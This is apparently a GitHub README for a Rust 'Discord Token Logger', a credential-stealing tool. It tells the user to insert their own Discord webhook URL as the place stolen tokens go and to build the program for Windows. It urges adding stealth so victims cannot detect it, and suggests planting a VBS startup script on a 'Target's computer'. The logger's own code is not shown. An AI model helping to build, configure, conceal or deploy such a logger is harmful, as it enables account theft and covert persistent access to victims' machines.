A Discord Token Logger Written in Rust.

### Configuration

On line 11 in [main.rs](https://github.com/MasterOfBrokenLogic/DiscordTokenLogger/blob/main/src/main.rs) , replace the variable with your webhook URL from Discord.
If you're unsure about what a Webhook URL is or how to obtain one, feel free to reach out to me on WhatsApp for assistance. I'm here to help, my friend!

```rust
let url = "Discord Webhook URL";
```

To build this project just run:

```shell
$ cargo build --target x86_64-pc-windows-gnu
```  

This is just a simple Token Logger, you can add more features for the stealth of the program, so no one can detect this. Create a vbs program in the Targets computer to run this project in the startup, If you need the vbs code to make this program to run in the startup, message me.
I hate strings :3
